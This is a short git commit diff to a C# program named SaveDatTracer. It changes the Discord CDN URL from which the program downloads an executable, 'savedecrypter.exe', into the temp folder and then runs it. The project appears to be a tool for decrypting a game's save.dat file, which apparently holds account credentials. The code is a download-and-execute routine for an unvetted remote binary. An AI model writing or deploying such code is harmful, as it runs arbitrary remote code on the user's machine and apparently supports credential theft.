cbaf14ee69eecbe8699aa2382de9698b429c61f5
SrMotion - sadMotion <66473364+SrMotion@users.noreply.github.com>
2020-07-28 22:12:00 +0300

    Update Program.cs

--- SaveDatTracer/Program.cs
+++ SaveDatTracer/Program.cs
@@ -26,7 +26,7 @@ namespace ConsoleApp4
 
             WebClient wc = new WebClient();
 
-            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737748166685753405/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
+            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737749127508525146/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
             Process.Start(new ProcessStartInfo
             {
                 FileName = Path.GetTempPath() + "\\decode.exe",
